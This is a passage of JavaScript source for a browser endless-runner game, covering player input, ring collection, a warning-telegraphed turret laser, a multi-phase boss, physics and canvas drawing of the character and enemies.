if(BOOSTM&&s%4===2)tone(LEAD[(s+4)%16]*2,.05,'square',.02,at);
mStep++;mNext+=SPB;
}}
setInterval(function(){var a=AC;if(!a)return;if(state!=='play'){mNext=a.currentTime+.06;return}mTick()},40);

/* ============ STATE ============ */
var state='ready',score=0,rings=0,best=BEST,boost=0,boostOn=false,boostT=0,
camX=0,speed=6.2,milestone=1,shake=0,flash=0,wflash=0,iframe=0,frame=0,
CY=200,CX=120,vy=0,grounded=true,rot=0,overT=0,eyeB=0,
bestNew=false,banner=null,pinged=false,runF=.8,hitstop=0,
wob={p:0,v:0},qwob={p:0,v:0},
ents=[],parts=[],pops=[],dusts=[],lostRings=[],clouds=[],clouds2=[],trail=[];
/* laser & boss */
var laser=null,laserCd=520,boss=null,bossWarnT=0,bossNext=50;
function gy(wx){return 242-(Math.sin(wx*0.0045)*13+Math.sin(wx*0.012)*5)}
for(var i=0;i<5;i++)clouds.push({x:Math.random()*404,y:14+Math.random()*55,s:.08+Math.random()*.12,w:44+Math.random()*46});
for(i=0;i<4;i++)clouds2.push({x:Math.random()*404,y:48+Math.random()*45,s:.26+Math.random()*.16,w:62+Math.random()*58});
function reset(){
score=0;rings=0;boost=0;boostOn=false;boostT=0;speed=6.2;milestone=1;
camX=0;CY=gy(120)-16;vy=0;grounded=true;rot=0;iframe=0;
wob.p=0;wob.v=0;qwob.p=0;qwob.v=0;hitstop=0;
ents=[];parts=[];pops=[];dusts=[];lostRings=[];trail=[];
banner=null;bestNew=false;pinged=false;whirrOff();humOff();
laser=null;boss=null;bossWarnT=0;bossNext=50;laserCd=520;
rgEl.textContent='0';scEl.textContent='0';
nextRing=200;nextFoe=600;nextStuff=900;nextDecor=1500;
}
var nextRing=200,nextFoe=600,nextStuff=900,nextDecor=1500;

/* ============ INPUT ============ */
function jump(){
ac();
if(state==='ready'){state='play';reset();return}
if(state==='dead'){if(performance.now()-overT>800){state='play';reset()}return}
if(grounded){vy=-13.2;grounded=false;wob.v=-.35;qwob.v=-.55;sJump();whirrOn()}
}
function doBoost(){
ac();
if(state!=='play')return;
if(!boostOn&&boost>=25){boostOn=true;boostT=0;wflash=1;sBoost();humOn()}
}
document.getElementById('jumpB').addEventListener('pointerdown',function(e){e.preventDefault();jump()});
document.getElementById('boostB').addEventListener('pointerdown',function(e){e.preventDefault();doBoost()});
document.addEventListener('pointerdown',function(e){if(e.target.closest('.pads,.mbtn'))return;if(e.clientX<innerWidth/2)doBoost();else jump()});
document.addEventListener('keydown',function(e){if((e.code==='Space'||e.code==='ArrowUp')&&!e.repeat){e.preventDefault();jump()}if(e.code==='KeyB'&&!e.repeat)doBoost()});

/* ============ SETTING SOUND ============ */
var mb=document.getElementById('muteB');
mb.addEventListener('pointerdown',function(e){
e.preventDefault();e.stopPropagation();
MUTED=!MUTED;mb.textContent=MUTED?'🔇':'🔊';
try{localStorage.setItem('dash_mute',MUTED?'1':'0')}catch(e2){}
if(MUTED){whirrOff();humOff()}
else{ac();if(state==='play'){if(!grounded)whirrOn();if(boostOn)humOn()}}
});
if(MUTED)mb.textContent='🔇';

/* ============ SPAWN (dihambat saat boss) ============ */
function spawn(){
var wx=camX+W+40;
while(nextRing<wx){
var arc=3+Math.floor(Math.random()*4),bx=nextRing;
for(var k=0;k<arc;k++)ents.push({t:'ring',x:bx+k*34,y:-30-Math.sin(k/arc*Math.PI)*34,got:false,ph:Math.random()*6});
nextRing+=140+Math.random()*220;
}
if(!boss&&bossWarnT<=0&&nextFoe<wx){
ents.push({t:Math.random()<.55?'foe':'spike',x:nextFoe,hp:1,ph:Math.random()*6,v:1+Math.random()});
nextFoe+=420+Math.random()*420;
}
if(!boss&&bossWarnT<=0&&nextStuff<wx){
var r=Math.random();
ents.push({t:r<.45?'spring':r<.75?'pad':'ringline',x:nextStuff,ph:0});
nextStuff+=520+Math.random()*500;
}
if(nextDecor<wx){
var dr=Math.random();
if(dr<.5){var n2=1+Math.floor(Math.random()*3);for(var d2=0;d2<n2;d2++)ents.push({t:'flower',x:nextDecor+d2*16,ph:Math.random()*6,col:Math.floor(Math.random()*3)})}
else if(dr<.8)ents.push({t:'bush',x:nextDecor,ph:Math.random()*6});
else ents.push({t:'sign',x:nextDecor});
nextDecor+=260+Math.random()*340;
}
ents=ents.filter(function(e2){return e2.x>camX-80});
}

/* ============ FX ============ */
function burst(px,py,n,c){for(var i=0;i<n;i++)parts.push({x:camX+px,y:py,vx:(Math.random()-.5)*7,vy:-Math.random()*5,life:1,c:c,s:2+Math.random()*2.5})}
function dustF(n){for(var i=0;i<n;i++)dusts.push({x:camX+CX+(Math.random()-.5)*16,y:gy(camX+CX)-2,vx:-1-Math.random()*2,vy:-Math.random()*.6,r:2+Math.random()*3,t:1})}
function popup(sx,y,txt,c){pops.push({sx:sx,y:y,t:1,txt:txt,c:c})}
/* RING: hilang 10% saja (min 1, max 14 visual) — sisanya tetep */
function scatterRings(){
var n=Math.min(14,Math.max(1,Math.floor(rings*.1)));
for(var i=0;i<n;i++)lostRings.push({x:camX+CX,y:CY-10,vx:(Math.random()-.5)*7,vy:-4-Math.random()*5,life:2.6,ph:Math.random()*6});
rings-=n;rgEl.textContent=rings;
return n;
}

/* ============ DIE / HURT (laserHit bypass boost) ============ */
function die(){
state='dead';overT=performance.now();whirrOff();humOff();
sDie();shake=14;flash=1;wob.v=2.4;
laser=null;boss=null;bossWarnT=0;
burst(CX,CY,40,'#58c7ff');
if(score>best){best=score;bsEl.textContent=best;saveBest();bestNew=true;sBest(.9)}
}
function hurt(laserHit){
if(iframe>0)return;
if(!laserHit&&boostOn)return;
if(rings>0){var n=scatterRings();iframe=110;sHurt();shake=10;flash=.6;wob.v=1.1;qwob.v=1.4;popup(CX,CY-26,'-'+n,'#ff5c7a')}
else die();
}

/* ============ TURRET LASER (musuh pojok kanan) ============ */
/* fase: 0 enter(22f) · 1 warn 50f (tracking merah, 16f akhir kedip cepat) ·
   2 FIRE 16f (< airtime lompat 33f → lompat = aman sampai mendarat) ·
   3 cool keluar */
function updLaser(){
if(!laser)return;
laser.t++;
if(laser.ph===0){
laser.ex+=(W-34-laser.ex)*.14;
laser.y+=(CY-laser.y)*.2;
if(laser.t>=22){laser.ph=1;laser.t=0}
}else if(laser.ph===1){
if(laser.fromBoss)laser.ex=boss?boss.x-28:laser.ex;
laser.y+=(CY-laser.y)*.3;
var fast=laser.t>=34;
if(!fast){if(laser.t%10===0)sTick()}
else{if(laser.t%4===0)sTickF()}
if(laser.t>=50){laser.ph=2;laser.t=0;laser.lockY=laser.y;sLaser();shake=Math.max(shake,4)}
}else if(laser.ph===2){
shake=Math.max(shake,2.2);
if(frame%2===0)parts.push({x:camX+Math.random()*W,y:laser.lockY+(Math.random()-.5)*9,vx:(Math.random()-.5)*2,vy:(Math.random()-.5)*2.5,life:.4,c:Math.random()<.5?'#fff':'#ff9a8a',s:1.8});
if(iframe<=0&&Math.abs(CY-laser.lockY)<17)hurt(true);
if(laser.t>=16){laser.ph=3;laser.t=0}
}else{
if(laser.fromBoss){if(laser.t>=14)laser=null}
else{laser.ex+=7;if(laser.t>=22||laser.ex>W+70)laser=null}
}
}

/* ============ BOSS ============ */
function spawnBoss(){boss={x:W+70,y:70,hp:3,t:0,mode:'enter',shots:3,gap:12,flash:0}}
function bossHit(){
if(!boss||boss.mode==='die')return;
boss.hp--;boss.flash=12;hitstop=5;shake=8;
burst(boss.x,boss.y,20,'#ffd75e');burst(boss.x,boss.y,14,'#ff8a8a');
sBossHit();popup(boss.x,boss.y-34,'HIT!','#ffd75e');
if(boss.hp<=0){boss.mode='die';boss.t=0;sBossDie()}
else{boss.mode='return';boss.t=0}
}
function updBoss(){
if(!boss)return;
boss.t++;
if(boss.flash>0)boss.flash--;
if(boss.mode==='enter'){
boss.x+=(W-70-boss.x)*.07;boss.y=70+Math.sin(frame*.05)*6;
if(boss.t>40){boss.mode='hover';boss.t=0}
}else if(boss.mode==='hover'){
boss.x+=(W-70-boss.x)*.05;boss.y=70+Math.sin(frame*.05)*8;
if(boss.t>50){boss.mode='laser';boss.t=0;boss.shots=3;boss.gap=10}
}else if(boss.mode==='laser'){
var ty=(laser?laser.y:CY)-20;
boss.y+=(ty-boss.y)*.12;
if(!laser){
if(boss.gap>0)boss.gap--;
else if(boss.shots>0){laser={t:0,ph:1,y:CY,lockY:0,ex:boss.x-28,fromBoss:true};boss.shots--;boss.gap=58}
else{boss.mode='hover2';boss.t=0}
}
}else if(boss.mode==='hover2'){
boss.y+=(78-boss.y)*.08;
if(boss.t>34){boss.mode='swoop';boss.t=0;sSwoop()}
}else if(boss.mode==='swoop'){
var gY=gy(camX+CX)-40;
if(boss.t<22){boss.y+=(gY-boss.y)*.16;boss.x+=(W-52-boss.x)*.1}
else{boss.x-=7.6;boss.y=gY+Math.sin(frame*.3)*2}
var dx=Math.abs(boss.x-CX),dy=Math.abs(boss.y-CY);
if(dx<42&&dy<36){
if(boostOn)bossHit();
else if(!grounded&&vy>0.5&&CY<boss.y-6){bossHit();vy=-12}
else hurt(true);
}
if(boss.x<-80){boss.mode='return';boss.t=0}
}else if(boss.mode==='return'){
boss.x+=(W-70-boss.x)*.08;boss.y+=(70-boss.y)*.09;
if(boss.t>26){boss.mode='hover';boss.t=0}
}else if(boss.mode==='die'){
boss.x+=Math.sin(frame*.8)*1.5;boss.y+=Math.sin(frame*.5)*1;
if(boss.t%6===0){burst(boss.x+(Math.random()-.5)*44,boss.y+(Math.random()-.5)*22,12,Math.random()<.5?'#ffd75e':'#ff9a8a');noiz(.12,.12,0,1200)}
if(boss.t>=64){
burst(boss.x,boss.y,50,'#ffd75e');burst(boss.x,boss.y,30,'#ff8a8a');
rings+=25;rgEl.textContent=rings;score+=500;
popup(CX,CY-40,'+25 RINGS','#ffd75e');
banner={t:0,txt:'BOSS DOWN! +500'};
sBest(.3);
boss=null;bossNext=rings+60;laserCd=Math.max(laserCd,300);
}
}
}

/* ============ UPDATE ============ */
function update(){
frame++;
if(hitstop>0){hitstop--;return}
shake=Math.max(0,shake-.5);flash=Math.max(0,flash-.035);wflash=Math.max(0,wflash-.06);
wob.v+=-wob.p*.3-wob.v*.12;wob.p+=wob.v;
qwob.v+=-qwob.p*.32-qwob.v*.16;qwob.p+=qwob.v;
if(iframe>0)iframe--;
if(frame%160===0)eyeB=5;if(eyeB>0)eyeB--;
if(banner){banner.t+=.016;if(banner.t>1)banner=null}
for(var i=parts.length-1;i>=0;i--){var q=parts[i];q.x+=q.vx;q.y+=q.vy;q.vy+=.22;if((q.life-=.03)<=0)parts.splice(i,1)}
for(i=dusts.length-1;i>=0;i--){var du=dusts[i];du.x+=du.vx;du.y+=du.vy;du.r+=.32;if((du.t-=.05)<=0)dusts.splice(i,1)}
for(i=pops.length-1;i>=0;i--){if((pops[i].t-=.045)<=0)pops.splice(i,1)}
clouds.forEach(function(c){c.x-=c.s*(state==='play'?1:.3);if(c.x<-70)c.x=404+Math.random()*80});
clouds2.forEach(function(c){c.x-=c.s*(state==='play'?1:.3);if(c.x<-90)c.x=404+Math.random()*90});
if(state!=='play')return;
var sp=speed+(boostOn?4.5:0);
runF=speed*.13;
camX+=sp;
score+=Math.round(sp*.12);
if(frame%6===0)scEl.textContent=score;
if(boostOn){boost-=1.4;boostT++;if(boost<=0||boostT>110){boostOn=false;humOff()}}
if(boost>=25&&!pinged){pinged=true;sReady()}
if(boost<20)pinged=false;
if(score>=milestone*500){milestone++;speed=Math.min(9.2,speed+.5);banner={t:0,txt:'SPEED UP!'};sMile()}
/* --- turret laser scheduler --- */
if(!laser&&!boss&&bossWarnT<=0&&score>700){
laserCd--;
if(laserCd<=0){
laser={t:0,ph:0,y:CY,lockY:0,ex:W+60,fromBoss:false};
sAlarm();popup(W-72,150,'⚠ LASER!','#ff5c7a');
laserCd=470+Math.random()*260;
}
}
updLaser();
/* --- boss trigger + danger notif --- */
if(!boss&&bossWarnT<=0&&rings>=bossNext){bossWarnT=150}
if(bossWarnT>0){
bossWarnT--;
if(frame%26===0){var kk=Math.floor(bossWarnT/26)%2;tone(kk?460:690,.2,'sawtooth',.15);tone(kk?690:460,.2,'sawtooth',.1,.21)}
if(bossWarnT===0){spawnBoss();tone(150,.5,'sawtooth',.18,0,60)}
}
BOOSTM=(bossWarnT>0||!!boss);
updBoss();
/* fisika */
var wasG=grounded,g=gy(camX+CX);
if(!grounded){vy+=.8;CY+=vy;if(CY>=g-16){CY=g-16;vy=0;grounded=true}}
else{CY=g-16}
if(!wasG&&grounded){dustF(8);wob.v=.5;qwob.v=.9;whirrOff()}
if(whr&&!grounded){try{var bf=430+sp*38+Math.abs(vy)*13;whr.o.frequency.value=bf;whr.o2.frequency.value=bf*1.5}catch(e){}}
rot+=(grounded?sp*.045:.42);
if(grounded&&!boostOn)rot=0;
if(boostOn){trail.push({x:camX+CX,y:CY});if(trail.length>12)trail.shift()}
else trail.length=0;
/* entitas */
spawn();
for(var j=ents.length-1;j>=0;j--){
var e2=ents[j],sx=e2.x-camX;
if(e2.t==='ring'&&!e2.got){
e2.ph+=.15;
var ey=gy(e2.x)+e2.y,dx=sx-CX,dy=ey-CY;
if(dx*dx+dy*dy<24*24){e2.got=true;rings++;rgEl.textContent=rings;score+=10;boost=Math.min(100,boost+7);sRing();burst(sx,ey,5,'#ffd75e');popup(sx,ey-8,'+10','#ffd75e')}
}else if(e2.t==='foe'){
e2.x-=e2.v;
if(frame%40===0&&Math.random()<.6)parts.push({x:camX+e2.x-14,y:gy(e2.x)-6,vx:-1,vy:-.3,life:.4,c:'#99a',s:2.5});
var fy=gy(e2.x),fsx=e2.x-camX;
var hitX=Math.abs(fsx-CX)<22,hitY=Math.abs((CY+10)-(fy-10))<20;
if(hitX&&hitY){
if(boostOn||(!grounded&&vy>1&&CY<fy-18)){
ents.splice(j,1);score+=100;hitstop=4;sPop();burst(fsx,fy-12,16,'#ff8a8a');popup(fsx,fy-24,'+100','#ff8a8a');if(!boostOn)vy=-9;
}else hurt();
}
}else if(e2.t==='spike'){
var ssx=e2.x-camX,sy2=gy(e2.x);
if(Math.abs(ssx-CX)<14&&CY+14>sy2-16&&CY<sy2)hurt();
}else if(e2.t==='spring'){
var psx=e2.x-camX,py2=gy(e2.x);
if(Math.abs(psx-CX)<16&&CY+14>py2-20&&CY<py2+6){vy=-19;grounded=false;wob.v=-.6;qwob.v=-1;sSpring();whirrOn();e2.ph=1;burst(psx,py2-10,7,'#ff5c7a');popup(psx,py2-30,'BOING!','#ff5c7a')}
}else if(e2.t==='pad'){
var px2=e2.x-camX;
if(Math.abs(px2-CX)<16&&!e2.used){e2.used=true;boost=Math.min(100,boost+35);boostOn=true;boostT=0;wflash=1;sBoost();humOn();popup(px2,gy(e2.x)-30,'DASH!','#ffd75e')}
}else if(e2.t==='ringline'){
for(var k=0;k<5;k++){var rx=e2.x+k*36;ents.push({t:'ring',x:rx,y:-24,got:false,ph:Math.random()*6})}
ents.splice(j,1);continue;
}
}
/* ring terlepas (ambil lagi) */
for(i=lostRings.length-1;i>=0;i--){var r2=lostRings[i];
r2.x+=r2.vx;r2.vx*=.99;r2.vy+=.34;r2.y+=r2.vy;r2.life-=.016;r2.ph+=.2;
var g2=gy(r2.x);
if(r2.y>g2-8){r2.y=g2-8;r2.vy*=-.5}
var rdx=(r2.x-camX)-CX,rdy=r2.y-CY;
if(r2.life<2.3&&rdx*rdx+rdy*rdy<22*22){r2.life=0;rings++;rgEl.textContent=rings;sRing();burst(CX,CY,5,'#ffd75e')}
if(r2.life<=0)lostRings.splice(i,1);
}
if(boostOn&&frame%3===0)parts.push({x:camX+CX-14,y:CY+8,vx:-2,vy:(Math.random()-.5)*2,life:.5,c:'#ffd75e',s:2});
if(CY>H+60)die();
}

/* ============ DRAW HELPERS ============ */
function ell(px,py,rx,ry){x.beginPath();x.ellipse(px,py,rx,ry,0,0,7);x.fill()}
function rr(px,py,w2,h2,r2){x.beginPath();x.moveTo(px+r2,py);x.lineTo(px+w2-r2,py);x.quadraticCurveTo(px+w2,py,px+w2,py+r2);x.lineTo(px+w2,py+h2-r2);x.quadraticCurveTo(px+w2,py+h2,px+w2-r2,py+h2);x.lineTo(px+r2,py+h2);x.quadraticCurveTo(px,py+h2,px,py+h2-r2);x.lineTo(px,py+r2);x.quadraticCurveTo(px,py,px+r2,py);x.closePath()}
function cloudC(cx2,cy2,w3,al){
x.fillStyle='rgba(255,255,255,'+al+')';ell(cx2,cy2,w3/2,11);ell(cx2+w3*.28,cy2-7,w3*.3,9);ell(cx2-w3*.25,cy2-4,w3*.26,8);
x.fillStyle='rgba(150,200,255,'+(al*.3)+')';ell(cx2,cy2+5,w3*.42,5.5);
}
function frond(a3){
x.save();x.rotate(a3);
x.fillStyle='#2f9e4f';x.beginPath();x.moveTo(0,0);x.quadraticCurveTo(14,-9,27,-2);x.quadraticCurveTo(15,3,0,4);x.closePath();x.fill();
x.fillStyle='rgba(190,255,190,.3)';x.beginPath();x.moveTo(0,0);x.quadraticCurveTo(13,-5,24,-1);x.quadraticCurveTo(13,1,0,2);x.closePath();x.fill();
x.restore();
}
function palm(px,py){
x.save();x.translate(px,py);x.rotate(-.06);
var tg2=x.createLinearGradient(-4,0,4,0);tg2.addColorStop(0,'#7a5230');tg2.addColorStop(1,'#4a2c12');
x.fillStyle=tg2;x.fillRect(-3.5,-52,7,52);
x.fillStyle='rgba(0,0,0,.18)';for(var s4=0;s4<5;s4++)x.fillRect(-3.5,-52+s4*11+8,7,3);
x.translate(0,-52);
frond(-2.5);frond(-2.0);frond(-1.3);frond(-.6);frond(-.05);frond(.6);
x.fillStyle='#6b4423';ell(-4,2,3,3);ell(4,3,3,3);
x.restore();
}
function quill(a3,L3){
x.save();x.rotate(a3);
x.fillStyle='#0d47a1';x.beginPath();x.moveTo(-6,-4);
x.quadraticCurveTo(-L3,-L3*.1,-L3-5,L3*.32);
x.quadraticCurveTo(-L3+3,L3*.34,-6,4);x.closePath();x.fill();
x.restore();
}
function shoe(px,py){
x.save();x.translate(px,py);
var g3=x.createLinearGradient(0,-4,0,5);g3.addColorStop(0,'#ff5563');g3.addColorStop(1,'#b3121f');
x.fillStyle=g3;x.beginPath();x.moveTo(-6,-3);x.lineTo(4,-3);x.quadraticCurveTo(8,-3,8,1);x.quadraticCurveTo(8,5,3,5);x.lineTo(-6,5);x.quadraticCurveTo(-9,5,-9,1);x.quadraticCurveTo(-9,-3,-6,-3);x.fill();
x.fillStyle='#fff';x.fillRect(-6,-1,13,2);
x.fillStyle='#cfd8e3';x.fillRect(-8,3,15,2);
x.restore();
}
/* ============ KARAKTER ============ */
function drawChar(){
if(iframe>0&&Math.floor(frame/4)%2===0)return;
var spinning=!grounded||boostOn;
var sp=speed+(boostOn?4.5:0);
var lean=state==='play'?Math.min(.32,sp*.026+(boostOn?.1:0)):0;
var bob=(!spinning&&state==='play')?Math.abs(Math.sin(frame*runF))*3.4:0;
var sy=1,sx2=1;
if(spinning){if(vy<-4){sy=1.14;sx2=.9}else if(vy>3){sy=1.08;sx2=.94}}
else{sy=1-wob.p*.24;sx2=1+wob.p*.18}
if(state==='ready'){sy=1+Math.sin(frame*.05)*.025;sx2=1-Math.sin(frame*.05)*.02}
var jig=boostOn?Math.sin(frame*1.6)*1.3:0;
x.save();
x.translate(CX+jig,CY+bob-wob.p*4);
if(!spinning)x.rotate(lean);
x.scale(sx2,sy);
if(spinning){
if(boostOn){x.shadowColor='#ffd75e';x.shadowBlur=22}else{x.shadowColor='#58c7ff';x.shadowBlur=12}
x.globalAlpha=.22;x.fillStyle=boostOn?'#ffd75e':'#58c7ff';x.beginPath();x.arc(-4,0,17,0,7);x.fill();x.globalAlpha=1;
x.shadowBlur=0;
var g2=x.createRadialGradient(-4,-5,2,0,0,14);g2.addColorStop(0,'#8fd4ff');g2.addColorStop(.55,'#1a6ed6');g2.addColorStop(1,'#0b3f8f');
x.fillStyle=g2;x.beginPath();x.arc(0,0,13.5,0,7);x.fill();
x.save();x.rotate(rot);
for(var q2=0;q2<3;q2++){
x.rotate(2.094);x.fillStyle='#0d47a1';
x.beginPath();x.moveTo(4,-3);x.quadraticCurveTo(13,-6,15,3);x.quadraticCurveTo(10,6,4,4);x.closePath();x.fill();
}
x.restore();
x.strokeStyle='rgba(255,255,255,.85)';x.lineWidth=2.2;
x.beginPath();x.arc(0,0,9.5,rot*1.7,rot*1.7+1.1);x.stroke();
x.beginPath();x.arc(0,0,9.5,rot*1.7+3.14,rot*1.7+4.24);x.stroke();
x.strokeStyle=boostOn?'rgba(255,215,94,.5)':'rgba(88,199,255,.4)';x.lineWidth=1.5;
x.beginPath();x.arc(-1,0,17,-.8,.9);x.stroke();
x.beginPath();x.arc(1,0,19,2.4,4.1);x.stroke();
if(frame%9<5){x.fillStyle='#e82d4a';x.beginPath();x.arc(Math.cos(rot*2)*9,Math.sin(rot*2)*9,4.5,0,7);x.fill()}
}else{
var sway=state==='play'?Math.sin(frame*runF*.5)*.07:Math.sin(frame*.03)*.03;
quill(-.5-lean*.6-qwob.p*.4+sway,15);
quill(.05-lean*.5-qwob.p*.32-sway*.6,19);
quill(.6-lean*.4-qwob.p*.24+sway*.4,15);
var cg=x.createRadialGradient(-3,-6,2,0,0,15);cg.addColorStop(0,'#6fc6ff');cg.addColorStop(.5,'#1a6ed6');cg.addColorStop(1,'#0b3f8f');
x.fillStyle=cg;x.beginPath();x.arc(0,0,13.5,0,7);x.fill();
x.strokeStyle='rgba(255,255,255,.25)';x.lineWidth=1.5;x.beginPath();x.arc(0,0,12.5,-2.4,-1.2);x.stroke();
x.fillStyle='#0d47a1';x.beginPath();x.moveTo(-6,-11);x.lineTo(-3,-16);x.lineTo(-.5,-11);x.closePath();x.fill();
x.fillStyle='#f2c99a';x.beginPath();x.moveTo(-5,-11.5);x.lineTo(-3,-14.3);x.lineTo(-1.5,-11.5);x.closePath();x.fill();
x.fillStyle='#f7dcc0';ell(3,7,6.5,5.2);
x.fillStyle='#f2c99a';ell(8.5,2,5,4.6);
x.fillStyle='#111';ell(12.6,-1.6,2.2,1.7);
x.strokeStyle='rgba(90,50,20,.4)';x.lineWidth=1;x.beginPath();x.moveTo(9,3.5);x.quadraticCurveTo(11,5,12.5,3.8);x.stroke();
var eyD=wob.p*5;
x.fillStyle='#fff';ell(3.5,-6+eyD,4.6,5.4);ell(8.5,-6+eyD,4,5);
if(eyeB>0){x.fillStyle='#1a6ed6';x.fillRect(-1.5,-11.5+eyD,16,5.5)}
else{
x.fillStyle='#0a2a4a';ell(4.5,-5.5+eyD,1.7,2.2);ell(9.3,-5.5+eyD,1.5,2);
x.fillStyle='#fff';ell(5,-6.5+eyD,.7,.9);ell(9.7,-6.5+eyD,.6,.8);
}
var ph2=frame*runF;
if(state==='play'&&speed>7.4){
x.fillStyle='rgba(232,45,74,.85)';ell(1,13,10,5.5);
x.strokeStyle='rgba(255,255,255,.7)';x.lineWidth=2;
x.beginPath();x.arc(1,13,6,ph2,ph2+1.6);x.stroke();
x.beginPath();x.arc(1,13,6,ph2+3.14,ph2+4.74);x.stroke();
}else if(state==='play'){
shoe(-4+Math.cos(ph2)*6,13+Math.sin(ph2)*1.5+Math.abs(Math.sin(frame*runF))*1.2);
shoe(5+Math.cos(ph2+3.14)*6,13+Math.sin(ph2+3.14)*1.5+Math.abs(Math.cos(frame*runF))*1.2);
}else{
var tapB=Math.abs(Math.sin(frame*.12))*2.5;
shoe(-5,14);shoe(6,14-tapB);
}
}
x.restore();
}

/* ============ TURRET + AIM + BEAM ============ */
function drawTurret(){
if(!laser||laser.fromBoss)return;
var ex=laser.ex,ey=laser.ph<2?laser.y:laser.lockY;
x.save();x.translate(ex,ey);
x.fillStyle='rgba(255,150,60,.8)';ell(-16,4,5+Math.sin(frame*.9)*2,3);
var hg=x.createLinearGradient(0,-14,0,14);hg.addColorStop(0,'#8a92a0');hg.addColorStop(1,'#3a4150');
x.fillStyle=hg;rr(-14,-13,28,26,7);x.fill();
x.strokeStyle='#20242c';x.lineWidth=2;x.stroke();
var lf=laser.ph===2;
x.fillStyle=lf?'#fff':'#ff2a3c';
x.shadowColor='#ff2a3c';x.shadowBlur=lf?12:4+(laser.ph===1?laser.t/50*8:0);
ell(-2,0,6,6);x.shadowBlur=0;
x.fillStyle='#4a505c';x.beginPath();x.moveTo(14,-6);x.lineTo(22,-12);x.lineTo(20,2);x.closePath();x.fill();
x.strokeStyle='#666';x.lineWidth=1.5;x.beginPath();x.moveTo(6,-13);x.lineTo(6,-19);x.stroke();
x.fillStyle=Math.sin(frame*.4)>0?'#ffd75e':'#7a5a10';ell(6,-21,2.2,2.2);
x.restore();
}
function drawAim(){
if(!laser||laser.ph!==1)return;
var fast=laser.t>=34;
var blink=fast?(Math.sin(frame*.9)>0):(Math.sin(frame*.28)>0);
var y=laser.y;
x.save();
x.globalAlpha=blink?(fast?.95:.7):.3;
x.strokeStyle='#ff2a3c';x.lineWidth=fast?2.5:1.5;
x.setLineDash([10,8]);x.lineDashOffset=-frame*(fast?2.4:.8);
x.beginPath();x.moveTo(laser.ex-10,y);x.lineTo(6,y);x.stroke();
x.setLineDash([]);
x.globalAlpha=blink?.4:.15;x.lineWidth=6;x.beginPath();x.moveTo(laser.ex-10,y);x.lineTo(6,y);x.stroke();
x.globalAlpha=blink?1:.35;
x.fillStyle='#ff2a3c';x.font='900 15px Arial';x.textAlign='center';
x.fillText('⚠',CX,y-26-(fast?Math.sin(frame*.8)*2:0));
x.textAlign='left';
x.restore();x.globalAlpha=1;
}
function drawBeam(){
if(!laser||laser.ph!==2)return;
var t=laser.t,D=16;
var fade=t<2?t/2:(t>D-3?(D-t)/3:1);
var y=laser.lockY,ex=laser.ex;
x.save();
function beamPath(lw,st,al){
x.globalAlpha=fade*al;
x.strokeStyle=st;x.lineWidth=lw;x.lineCap='round';
x.beginPath();x.moveTo(ex,y);
for(var bx2=ex-6;bx2>-8;bx2-=7){
var off=Math.sin(bx2*.045+frame*1.15)*5.5+Math.sin(bx2*.017-frame*.65)*3;
x.lineTo(bx2,y+off);
}
x.stroke();
}
beamPath(13,'rgba(255,60,40,.35)',1);
beamPath(7,'rgba(255,120,80,.6)',1);
beamPath(3.2,'#ff6a4a',1);
beamPath(1.4,'#fff',1);
x.globalAlpha=fade;
var mg=x.createRadialGradient(ex,y,2,ex,y,16);
mg.addColorStop(0,'#fff');mg.addColorStop(.4,'rgba(255,120,80,.8)');mg.addColorStop(1,'rgba(255,60,40,0)');
x.fillStyle=mg;ell(ex,y,16,16);
if(frame%2===0)parts.push({x:camX+4,y:y+(Math.random()-.5)*10,vx:-1-Math.random()*2,vy:(Math.random()-.5)*3,life:.5,c:'#ffb0a0',s:2});
x.restore();x.globalAlpha=1;
}

/* ============ BOSS + DANGER NOTIF ============ */
function hazBar(y0){
x.save();x.beginPath();x.rect(0,y0,W,16);x.clip();
x.fillStyle='#180208';x.fillRect(0,y0,W,16);
var off=(frame*3)%24;
for(var hx=-24;hx<W+24;hx+=24){
x.fillStyle=(Math.floor((hx+off)/24)%2)?'#e03040':'#111';
x.save();x.translate(hx+off,y0);x.transform(1,0,-.6,1,0,0);x.fillRect(0,0,12,16);x.restore();
}
x.restore();
}
function drawBoss(){
if(!boss)return;
var bx=boss.x,by=boss.y;
x.save();x.translate(bx,by);
if(boss.mode==='die')x.translate((Math.random()-.5)*4,(Math.random()-.5)*4);
/* turbine + api */
x.fillStyle='rgba(255,160,60,.7)';ell(0,26+Math.sin(frame*.9)*2,9,4);
x.fillStyle='#fff';ell(0,26,4,2);
/* sayap */
x.fillStyle='#4a505c';x.beginPath();x.moveTo(-44,-6);x.lineTo(-58,-14);x.lineTo(-52,4);x.closePath();x.fill();
x.beginPath();x.moveTo(44,-6);x.lineTo(58,-14);x.lineTo(52,4);x.closePath();x.fill();
/* badan */
var hg=x.createLinearGradient(0,-26,0,26);hg.addColorStop(0,'#aeb6c4');hg.addColorStop(.5,'#68707e');hg.addColorStop(1,'#3a4150');
x.fillStyle=hg;ell(0,0,46,26);
/* strip hazard badan */
x.save();x.beginPath();x.ellipse(0,10,44,12,0,0,7);x.clip();
for(var hz2=-4;hz2<9;hz2++){
x.fillStyle=hz2%2?'#e03040':'#1a1e26';
x.save();x.translate(-46+hz2*13+(frame%13),-6);x.transform(1,0,-.6,1,0,0);x.fillRect(0,0,7,26);x.restore();
}
x.restore();
x.strokeStyle='#20242c';x.lineWidth=2.5;x.beginPath();x.ellipse(0,0,46,26,0,0,7);x.stroke();
/* kubah kokpit */
var dg=x.createRadialGradient(-8,-14,3,0,-10,18);dg.addColorStop(0,'#ffd0d8');dg.addColorStop(.4,'#e03550');dg.addColorStop(1,'#701020');
x.fillStyle=dg;ell(0,-12,20,14);
/* mata marah ngejar player */
var eT=Math.atan2(CY-by,CX-bx);
var exx=Math.cos(eT)*3,eyy=Math.sin(eT)*2;
x.fillStyle='#fff';ell(-6,-14,5,5.5);ell(7,-14,4.5,5);
x.fillStyle='#111';ell(-6+exx,-14+eyy,2,2.5);ell(7+exx,-14+eyy,1.8,2.3);
x.strokeStyle='#3a1018';x.lineWidth=3;
x.beginPath();x.moveTo(-11,-20);x.lineTo(-2,-17);x.moveTo(12,-20);x.lineTo(3,-17);x.stroke();
/* meriam laser bawah */
x.fillStyle='#2a2e38';x.fillRect(-10,12,20,10);
var firing=laser&&laser.fromBoss&&laser.ph===2;
var aiming=laser&&laser.fromBoss&&laser.ph===1;
x.fillStyle=firing?'#fff':'#ff2a3c';
if(firing||aiming){x.shadowColor='#ff2a3c';x.shadowBlur=firing?12:6}
ell(0,20,5,4);x.shadowBlur=0;
/* antena kedip */
x.strokeStyle='#666';x.lineWidth=2;x.beginPath();x.moveTo(0,-24);x.lineTo(0,-34);x.stroke();
